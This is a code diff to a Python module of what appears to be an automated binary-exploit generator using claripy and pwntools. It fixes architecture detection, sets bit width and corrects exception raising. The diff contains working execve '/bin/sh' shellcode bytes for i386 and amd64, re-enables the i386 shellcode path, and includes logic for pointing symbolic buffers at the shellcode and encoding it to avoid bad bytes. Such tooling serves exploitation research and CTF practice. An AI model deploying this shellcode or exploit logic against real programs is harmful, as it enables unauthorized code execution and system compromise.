@@ -1,6 +1,7 @@
 import claripy
 from .radare_helper import findShellcode
 from pwn import *
+import timeout_decorator
 
 is_printable = False
 
@@ -29,13 +30,15 @@ def constrainToAddress(state, sym_val, addr, endian="little"):
 
 def getShellcode(properties):
     context.arch = properties["protections"]["arch"]
+    context.bits = 32
 
-    if context.arch == "i386" and False:  # /bin/sh shellcode - 23 bytes
+    if context.arch == "i386":  # /bin/sh shellcode - 23 bytes
         shellcode = (
             b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
             + b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
         )
-    elif context.arch == "x64":  # /bin/sh shellcode - 23 bytes
+    elif context.arch == "amd64":  # /bin/sh shellcode - 23 bytes
+        context.bits = 64
         shellcode = (
             b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
             + b"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
@@ -194,12 +197,12 @@ def point_to_shellcode_filter(simgr):
                     print(
                         "New shellcode: {} {}".format(len(shellcode), repr(shellcode))
                     )
-                except PwnlibException as e:
+                except PwnlibException:
                     print(
                         "[-] Unable to encode shellcode to avoid {}".format(avoidList)
                     )
-                except TypeError as e:
-                    raise("Pwntools encoders not ported to python3. Can't encode shellcode to avoid bad byte")
+                except TypeError:
+                    raise RuntimeError("Pwntools encoders not ported to python3. Can't encode shellcode to avoid bad byte")
                 break
 
         # addresses = [x for x in find_symbolic_buffer(state,len(shellcode))]
